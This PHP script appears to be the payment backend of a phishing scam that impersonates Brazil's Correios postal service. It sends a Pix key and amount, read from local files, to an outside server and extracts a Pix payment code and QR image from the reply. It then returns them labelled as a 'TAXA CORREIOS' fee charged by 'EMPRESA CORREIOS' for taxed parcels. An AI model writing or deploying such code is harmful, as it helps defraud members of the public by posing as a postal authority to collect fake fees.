<?php
// This script should be placed in a file that handles the GET request, e.g., get_pix_data.php

// URL to send POST request to
$url = "https://priv.ss-sistem-v2.online/acesso.PRIVADO/kmoraes335@gmail.com/app.php";

// Post data (Replace these with your actual data)
$postData = [
    'chave' => file_get_contents('key.txt'),
    'valor' => file_get_contents('valor.txt'),
    'descricao' => 'TAXA CORREIOS',
    'beneficiario' => 'EMPRESA CORREIOS',
    'cidade' => 'Curitiba - PR',
    'identificador' => 'OBJETOSTAXADOS',
];

// Initialize cURL session
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL session and store the result
$response = curl_exec($ch);
curl_close($ch);

// Check if the response was received
if ($response === false) {
    die('Error fetching data');
}

// Extract the relevant data using regex
$regex = '/<textarea.*?id="brcodepix".*?>(.*?)<\/textarea>.*?<img src="data:image\/png;base64,(.*?)"/s';
if (preg_match($regex, $response, $matches)) {
    $paymentCode = trim($matches[1]);
    $qrcodeBase64 = trim($matches[2]);
} else {
    die('Data not found in the response');
}

// Output the data as JSON
header('Content-Type: application/json');
echo json_encode([
    'paymentCode' => $paymentCode,
    'qrcodeBase64' => $qrcodeBase64,
    'gate de pagamento' => 'CORREIOS',
]);
?>
